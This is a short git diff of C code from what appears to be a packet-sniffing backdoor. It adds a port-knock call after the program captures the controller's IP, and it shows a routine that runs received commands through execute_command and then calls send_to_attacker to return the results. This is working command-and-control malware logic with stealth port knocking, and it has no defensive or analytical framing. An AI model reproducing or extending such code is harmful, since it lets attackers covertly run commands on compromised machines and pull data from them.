@@ -94,6 +94,7 @@ void process_ipv4(u_char *arg, const struct pcap_pkthdr* pkthdr, const u_char* p
         convert_uint32t_ip_to_str(ip->saddr, opts->dest_ip, 'A');
         opts->udpsa.sin_addr.s_addr = inet_addr(opts->dest_ip);
         opts->tcpsa.sin_addr.s_addr = inet_addr(opts->dest_ip);
+        port_knock(opts->dest_ip, CLOSE_ATF);
         opts->ip_flag = TRUE;
     }
     setvbuf(stdout, NULL, _IONBF, 0);
@@ -158,12 +159,10 @@ void execute_instruction(u_char *args) {
         ov->target = TRUE;
     }
     else {
-        // TODO: PORT KNOCK
         commands = split_line(ov->instruction);
         execute_command(commands, args);
         free(commands);
         send_to_attacker(args);
-        // TODO: PORT KNOCK CLOSE
     }
     memset(ov->instruction, 0, S_ARR_SIZE);
 }
